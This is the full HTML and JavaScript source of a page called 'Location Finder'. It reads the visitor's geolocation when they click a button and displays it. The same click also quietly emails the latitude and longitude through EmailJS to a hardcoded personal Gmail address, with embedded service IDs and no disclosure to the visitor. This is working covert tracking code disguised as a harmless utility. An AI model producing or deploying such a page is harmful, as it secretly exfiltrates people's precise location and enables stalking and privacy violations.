<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Location Finder</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 50px;
    }
    #location {
      margin-top: 20px;
      font-size: 18px;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
</head>
<body>
  <h1>Find Your Location</h1>
  <button id="getLocationBtn">Get My Location</button>
  <div id="location"></div>

  <script>
    (function() {
      emailjs.init('9x-l5mk9badvHiIkw'); // Replace with your EmailJS user ID
    })();

    const button = document.getElementById('getLocationBtn');
    const locationDiv = document.getElementById('location');

    button.addEventListener('click', () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const { latitude, longitude } = position.coords;
            locationDiv.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;

            // Send email with the coordinates
            const emailParams = {
              to_email: 'alex69gggamer@gmail.com',  // Replace with your email
              latitude: latitude,
              longitude: longitude
            };

            emailjs.send('service_3ubhjey', 'template_lytk4r9', emailParams)
              .then((response) => {
                console.log('Email sent successfully', response);
              })
              .catch((error) => {
                console.error('Error sending email', error);
              });
          },
          (error) => {
            locationDiv.textContent = `Error: ${error.message}`;
          }
        );
      } else {
        locationDiv.textContent = "Geolocation is not supported by your browser.";
      }
    });
  </script>
</body>
</html>
